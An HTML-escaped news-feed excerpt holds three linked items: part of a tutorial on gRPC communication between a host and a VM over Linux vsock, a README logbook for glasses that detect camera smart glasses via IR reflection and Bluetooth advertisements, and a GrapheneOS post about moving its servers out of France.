  builder.AddListeningPort(server_address, grpc::InsecureServerCredentials());
  builder.RegisterService(&amp;amp;service);

  std::unique_ptr&amp;lt;Server&amp;gt; server(builder.BuildAndStart());
  std::cout &amp;lt;&amp;lt; "Server listening on " &amp;lt;&amp;lt; server_address &amp;lt;&amp;lt; std::endl;

  server-&amp;gt;Wait();
}

int main() {
  RunServer();
  return 0;
}&lt;/code&gt;
    &lt;p&gt;The only part requiring explanation is the &lt;code&gt;server_address&lt;/code&gt;. The &lt;code&gt;vsock:&lt;/code&gt; prefix indicates that we’re using &lt;code&gt;vsock&lt;/code&gt; as the transport layer. gRPC supports various transports, including TCP/IP and Unix sockets.&lt;/p&gt;
    &lt;p&gt;The number &lt;code&gt;3&lt;/code&gt; is the CID, or Context ID. This functions similarly to an IP address. Certain CIDs have special meanings. For instance, CID 2 represents the VM host itself; if the VM needs to connect to a &lt;code&gt;vsock&lt;/code&gt; socket on the host, it targets CID 2. CID 1 is reserved for the loopback address. Generally, VMs are assigned CIDs starting from 3.&lt;/p&gt;
    &lt;p&gt;The &lt;code&gt;9999&lt;/code&gt; is simply the port number, functioning just as it does in TCP/IP.&lt;/p&gt;
    &lt;head rend="h3"&gt;Client implementation&lt;/head&gt;
    &lt;p&gt;The &lt;code&gt;BUILD&lt;/code&gt; file is, again, quite simple:&lt;/p&gt;
    &lt;code&gt;load("@rules_cc//cc:defs.bzl", "cc_binary")

cc_binary(
    name = "client",
    srcs = [
        "client.cc",
    ],
    deps = [
        "@grpc//:grpc++",
        "//proto:vsock_service_cc_grpc",
        "//proto:vsock_service_cc_proto",
    ],
    linkstatic = True,
    linkopts = [
        "-static",
    ],
)&lt;/code&gt;
    &lt;p&gt;And the C++ code:&lt;/p&gt;
    &lt;code&gt;#include &amp;lt;iostream&amp;gt;
#include &amp;lt;memory&amp;gt;
#include &amp;lt;string&amp;gt;

#include &amp;lt;grpc++/grpc++.h&amp;gt;
#include "proto/vsock_service.grpc.pb.h"

using grpc::Channel;
using grpc::ClientContext;
using grpc::Status;
using popovicu_vsock::VsockService;
using popovicu_vsock::AdditionRequest;
using popovicu_vsock::AdditionResponse;

class VsockClient {
 public:
  VsockClient(std::shared_ptr&amp;lt;Channel&amp;gt; channel)
      : stub_(VsockService::NewStub(channel)) {}

  int32_t Add(int32_t a, int32_t b) {
    AdditionRequest request;
    request.set_a(a);
    request.set_b(b);

    AdditionResponse response;
    ClientContext context;

    Status status = stub_-&amp;gt;Addition(&amp;amp;context, request, &amp;amp;response);

    if (status.ok()) {
      return response.c();
    } else {
      std::cout &amp;lt;&amp;lt; "RPC failed: " &amp;lt;&amp;lt; status.error_code() &amp;lt;&amp;lt; ": "
                &amp;lt;&amp;lt; status.error_message() &amp;lt;&amp;lt; std::endl;
      return -1;
    }
  }

 private:
  std::unique_ptr&amp;lt;VsockService::Stub&amp;gt; stub_;
};

int main() {
  // Client running on host, connecting to VM server
  // vsock:3:9999 means connect to CID 3 (guest VM) on port 9999
  // CID 3 is an example - adjust based on your VM's actual CID
  std::string server_address("vsock:3:9999");

  VsockClient client(
      grpc::CreateChannel(server_address, grpc::InsecureChannelCredentials()));

  int32_t a = 5;
  int32_t b = 7;
  int32_t result = client.Add(a, b);

  std::cout &amp;lt;&amp;lt; "Addition result: " &amp;lt;&amp;lt; a &amp;lt;&amp;lt; " + " &amp;lt;&amp;lt; b &amp;lt;&amp;lt; " = " &amp;lt;&amp;lt; result
            &amp;lt;&amp;lt; std::endl;

  return 0;
}&lt;/code&gt;
    &lt;head rend="h2"&gt;Running it all together&lt;/head&gt;
    &lt;p&gt;Bazel shines here. You only need a working C++ compiler on your host system. Bazel automatically fetches and builds everything else on the fly, including the Protobuf compiler.&lt;/p&gt;
    &lt;p&gt;To get the statically linked server binary:&lt;/p&gt;
    &lt;code&gt;bazel build //server&lt;/code&gt;
    &lt;p&gt;Similarly, for the client:&lt;/p&gt;
    &lt;code&gt;bazel build //client&lt;/code&gt;
    &lt;p&gt;To create a VM image, I used &lt;code&gt;debootstrap&lt;/code&gt; on an &lt;code&gt;ext4&lt;/code&gt; image, as described in this post on X:&lt;/p&gt;
    &lt;quote&gt;&lt;p&gt;Stop downloading 4GB ISOs to create Linux VMs.&lt;/p&gt;— Uros Popovic (@popovicu94) November 25, 2025&lt;lb/&gt;You don't need an installer, a GUI, or a "Next &amp;gt; Next &amp;gt; Finish" wizard. You just need a directory of files.&lt;lb/&gt;Here is how I build custom, hacky, bootable Debian VMs in 60 seconds using debootstrap.&lt;lb/&gt;Your distro is just a kernel and a… pic.twitter.com/l4mM02zPmr&lt;/quote&gt;
    &lt;p&gt;This is a quick, albeit hacky, solution for creating a runnable Debian instance.&lt;/p&gt;
    &lt;p&gt;Next, I copied the newly built server binary to &lt;code&gt;/opt&lt;/code&gt; within the image.&lt;/p&gt;
    &lt;p&gt;Now, the VM can be booted straight into the server binary as soon as the kernel runs:&lt;/p&gt;
    &lt;code&gt; qemu-system-x86_64 -m 1G -kernel /tmp/linux/linux-6.17.2/arch/x86/boot/bzImage \
  -nographic \
  -append "console=ttyS0 init=/opt/server root=/dev/vda rw" \
  --enable-kvm \
  -smp 8 \
  -drive file=./debian.qcow2,format=qcow2,if=virtio -device vhost-vsock-pci,guest-cid=3&lt;/code&gt;
    &lt;p&gt;As shown in the last line, a virtual device is attached to the QEMU VM acting as &lt;code&gt;vsock&lt;/code&gt; networking hardware, configured with CID 3.&lt;/p&gt;
    &lt;p&gt;The QEMU output shows:&lt;/p&gt;
    &lt;code&gt;[    1.581192] Run /opt/server as init process
[    1.889382] random: crng init done
Server listening on vsock:3:9999&lt;/code&gt;
    &lt;p&gt;To send an RPC to the server from the host, I ran the client binary:&lt;/p&gt;
    &lt;code&gt;bazel run //client&lt;/code&gt;
    &lt;p&gt;The output confirmed the result:&lt;/p&gt;
    &lt;code&gt;Addition result: 5 + 7 = 12&lt;/code&gt;
    &lt;p&gt;Correspondingly, the server output displayed:&lt;/p&gt;
    &lt;code&gt;Addition: 5 + 7 = 12&lt;/code&gt;
    &lt;p&gt;We have successfully invoked an RPC from the host to the VM!&lt;/p&gt;
    &lt;head rend="h2"&gt;Under the hood&lt;/head&gt;
    &lt;p&gt;I haven’t delved into the low-level system API for &lt;code&gt;vsock&lt;/code&gt;s, as frameworks typically abstract this away. However, &lt;code&gt;vsock&lt;/code&gt;s closely resemble TCP/IP sockets. Once created, they are used in the same way, though the creation API differs. Information on this is readily available online.&lt;/p&gt;
    &lt;head rend="h2"&gt;Conclusion&lt;/head&gt;
    &lt;p&gt;I believed it was more valuable to focus on a high-level RPC system over &lt;code&gt;vsock&lt;/code&gt; rather than raw sockets. With gRPC, you can invoke a structured RPC on a server running inside the VM. This opens the door to running interesting applications in sealed, isolated environments, allowing you to easily combine different OSes (e.g., a Debian host and an Arch guest) or any platform supporting &lt;code&gt;vsock&lt;/code&gt;. Additionally, gRPC allows you to write clients and servers in many different languages and technologies. This is achieved without network virtualization, resulting in increased efficiency.&lt;/p&gt;
    &lt;p&gt;I hope this was fun and useful to you as well.&lt;/p&gt;
    &lt;p&gt;Please consider following me on X and LinkedIn for further updates.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://popovicu.com/posts/how-to-use-linux-vsock-for-fast-vm-communication/"/><published>2025-11-28T05:19:45+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=46075882</id><title>Show HN: Glasses to detect smart-glasses that have cameras</title><updated>2025-11-28T08:15:26.173001+00:00</updated><content>&lt;doc fingerprint="37a0505728a445d9"&gt;
  &lt;main&gt;
    &lt;p&gt;Glasses to detect smart-glasses that have cameras&lt;/p&gt;
    &lt;p&gt;I'm experimenting with 2 main approaches:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Optics: classify the camera using light reflections.&lt;/item&gt;
      &lt;item&gt;Networking: bluetooth and wi-fi analysis.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;So far fingerprinting specific devices based on bluetooth (BLE) is looking like easiest and most reliable approach. The picture below is the first version, which plays the legend of zelda 'secret found' jingle when it detects a BLE advertisement from Meta Raybans.&lt;/p&gt;
    &lt;p&gt;I'm essentially treating this README like a logbook, so it will have my current approaches/ideas.&lt;/p&gt;
    &lt;p&gt;By sending IR at camera lenses, we can take advantage of the fact that the CMOS sensor in a camera reflects light directly back at the source (called 'retro-reflectivity' / 'cat-eye effect') to identify cameras.&lt;/p&gt;
    &lt;p&gt;This isn't exactly a new idea. Some researchers in 2005 used this property to create 'capture-resistant environments' when smartphones with cameras were gaining popularity.&lt;/p&gt;
    &lt;p&gt;There's even some recent research (2024) that figured out how to classify individual cameras based on their retro-reflections.&lt;/p&gt;
    &lt;p&gt;Now we have a similar situation to those 2005 researchers on our hands, where smart glasses with hidden cameras seem to be getting more popular. So I want to create a pair of glasses to identify these. Unfortunately, from what I can tell most of the existing research in this space records data with a camera and then uses ML, a ton of controlled angles, etc. to differentiate between normal reflective surfaces and cameras.&lt;/p&gt;
    &lt;p&gt;I would feel pretty silly if my solution uses its own camera. So I'll be avoiding that. Instead I think it's likely I'll have to rely on being consistent with my 'sweeps', and creating a good classifier based on signal data. For example you can see here that the back camera on my smartphone seems to produce quick and large spikes, while the glossy screen creates a more prolonged wave.&lt;/p&gt;
    &lt;p&gt;After getting to test some Meta Raybans, I found that this setup is not going to be sufficient. Here's a test of some sweeps of the camera-area + the same area when the lens is covered. You can see the waveform is similar to what I saw in the earlier test (short spike for camera, wider otherwise), but it's wildly inconsistent and the strength of the signal is very weak. This was from about 4 inches away from the LEDs. I didn't notice much difference when swapping between 940nm and 850nm LEDs.&lt;/p&gt;
    &lt;p&gt;So at least with current hardware that's easy for me to access, this probably isn't enough to differentiate accurately.&lt;/p&gt;
    &lt;p&gt;Another idea I had is to create a designated sweep 'pattern'. The user (wearing the detector glasses) would perform a specific scan pattern of the target. Using the waveforms captured from this data, maybe we can more accurately fingerprint the raybans. For example, sweeping across the targets glasses in a 'left, right, up, down' approach. I tested this by comparing the results of the Meta raybans vs some aviators I had lying around. I think the idea behind this approach is sound (actually it's light), but it might need more workshopping.&lt;/p&gt;
    &lt;p&gt;For prototyping, I'm using:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Arduino uno&lt;/item&gt;
      &lt;item&gt;a bunch of 940nm and 850nm IR LEDs&lt;/item&gt;
      &lt;item&gt;a photodiode as a receiver&lt;/item&gt;
      &lt;item&gt;a 2222A transistor&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;TODO:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;experiment with sweeping patterns&lt;/item&gt;
      &lt;item&gt;experiment with combining data from different wavelengths&lt;/item&gt;
      &lt;item&gt;collimation?&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;This has been more tricky than I first thought! My current approach here is to fingerprint the Meta Raybans over Bluetooth low-energy (BLE) advertisements. But, I have only been able to detect BLE traffic during 1) pairing 2) powering-on. I sometimes also see the advertisement as they are taken out of the case (while already powered on), but not consistently.&lt;/p&gt;
    &lt;p&gt;The goal is to detect them during usage when they're communicating with the paired phone, but to see this type of directed BLE traffic it seems like I would first need to see the &lt;code&gt;CONNECT_REQ&lt;/code&gt; packet which has information as to what which of the communication channels to hop between in sync. I don't think what I currently have (ESP32) is set up to do this kind of following.&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;potentially can use an nRF module for this&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;For any of the bluetooth classic (BTC) traffic, unfortunately the hardware seems a bit more involved (read: expensive). So if I want to do down this route, I'll likely need a more clever solution here.&lt;/p&gt;
    &lt;p&gt;When turned on or put into pairing mode (or sometimes when taken out of the case), I can detect the device through advertised manufacturer data and service UUIDs. &lt;code&gt;0x01AB&lt;/code&gt; is a Meta-specific SIG-assigned ID (assigned by the Bluetooth standards body), and &lt;code&gt;0xFD5F&lt;/code&gt; in the Service UUID is assigned to Meta as well.&lt;/p&gt;
    &lt;p&gt;capture when the glasses are powered on:&lt;/p&gt;
    &lt;code&gt;[01:07:06] RSSI: -59 dBm
Address: XX:XX:XX:XX:XX:XX
Name: Unknown

META/LUXOTTICA DEVICE DETECTED!
  Manufacturer: Meta (0x01AB)
  Service UUID: Meta (0xFD5F) (0000fd5f-0000-1000-8000-00805f9b34fb)

Manufacturer Data:
  Company ID: Meta (0x01AB)
  Data: 020102102716e4

Service UUIDs: ['0000fd5f-0000-1000-8000-00805f9b34fb']
&lt;/code&gt;
    &lt;p&gt;IEEE assigns certain MAC address prefixes (OUI, 'Organizationally Unique Identifier'), but these addresses get randomized so I don't expect them to be super useful for BLE.&lt;/p&gt;
    &lt;p&gt;Here's some links to more data if you're curious:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;https://www.bluetooth.com/wp-content/uploads/Files/Specification/HTML/Assigned_Numbers/out/en/Assigned_Numbers.pdf&lt;/item&gt;
      &lt;item&gt;https://gitlab.com/wireshark/wireshark/-/blob/99df5f588b38cc0964f998a6a292e81c7dcf0800/epan/dissectors/packet-bluetooth.c&lt;/item&gt;
      &lt;item&gt;https://www.netify.ai/resources/macs/brands/meta&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;TODO:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Read: https://dl.acm.org/doi/10.1145/3548606.3559372&lt;/item&gt;
      &lt;item&gt;try active probing/interrogating&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Thanks to Trevor Seets and Junming Chen for their advice in optics and BLE (respectively). Also to Sohail for lending me meta raybans to test with.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://github.com/NullPxl/banrays"/><published>2025-11-28T05:52:38+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=46076150</id><title>GrapheneOS Moving Out of France</title><updated>2025-11-28T08:15:25.958194+00:00</updated><content>&lt;doc fingerprint="bdc2021d20c67390"&gt;
  &lt;main&gt;
    &lt;p&gt;We no longer have any active servers in France and are continuing the process of leaving OVH. We'll be rotating our TLS keys and Let's Encrypt account keys pinned via accounturi. DNSSEC keys may also be rotated. Our backups are encrypted and can remain on OVH for now. Our App Store verifies the app store metadata with a cryptographic signature and downgrade protection along with verification of the packages. Android's package manager also has another layer of signature verification and downgrade protection. Our System Updater verifies updates with a cryptographic signature and downgrade protection along with another layer of both in update_engine and a third layer of both via verified boot. Signing channel release channel names is planned too. Our update mirrors are currently hosted on sponsored servers from ReliableSite (Los Angeles, Miami) and Tempest (London). London is a temporary location due to an emergency move from a provider which left the dedicated server business and will move. More sponsored update mirrors are coming. Our ns1 anycast network is on Vultr and our ns2 anycast network is on BuyVM since both support BGP for announcing our own IP space. We're moving our main website/network servers used for default OS connections to a mix of Vultr+BuyVM locations. We have 5 servers in Canada with OVH with more than static content and basic network services: email, Matrix, discussion forum, Mastodon and attestation. Our plan is to move these to Netcup root servers or a similar provider short term and then colocated servers in Toronto long term. France isn't a safe country for open source privacy projects. They expect backdoors in encryption and for device access too. Secure devices and services are not going to be allowed. We don't feel safe using OVH for even a static website with servers in Canada/US via their Canada/US subsidiaries. We were likely going to be able to release experimental Pixel 10 support very soon and it's getting disrupted. The attacks on our team with ongoing libel and harassment have escalated, raids on our chat rooms have escalated and more. It's rough right now and support is appreciated.&lt;/p&gt;
    &lt;p&gt;Nov 24, 2025 · 7:16 PM UTC&lt;/p&gt;
    &lt;p&gt; 193&lt;/p&gt;
    &lt;p&gt; 1,281&lt;/p&gt;
    &lt;p&gt; 7,736&lt;/p&gt;
    &lt;p&gt; 1,205,579&lt;/p&gt;
    &lt;p&gt;It's not possible for GrapheneOS to produce an update for French law enforcement to bypass brute force protection since it's implemented via the secure element (SE). SE also only accepts correctly signed firmware with a greater version AFTER the Owner user unlocks successfully.&lt;/p&gt;
    &lt;p&gt; 2&lt;/p&gt;
    &lt;p&gt; 38&lt;/p&gt;
    &lt;p&gt; 994&lt;/p&gt;
    &lt;p&gt; 62,551&lt;/p&gt;
    &lt;p&gt;We would have zero legal obligation to do it but it's not even possible. We have a list our official hardware requirements including secure element throttling for disk encryption key derivation (Weaver) combined with insider attack resistance. Why aren't they blaming Google?&lt;/p&gt;
    &lt;p&gt; 2&lt;/p&gt;
    &lt;p&gt; 28&lt;/p&gt;
    &lt;p&gt; 856&lt;/p&gt;
    &lt;p&gt; 63,404&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://xcancel.com/GrapheneOS/status/1993035936800584103"/><published>2025-11-28T06:43:13+00:00</published></entry></feed>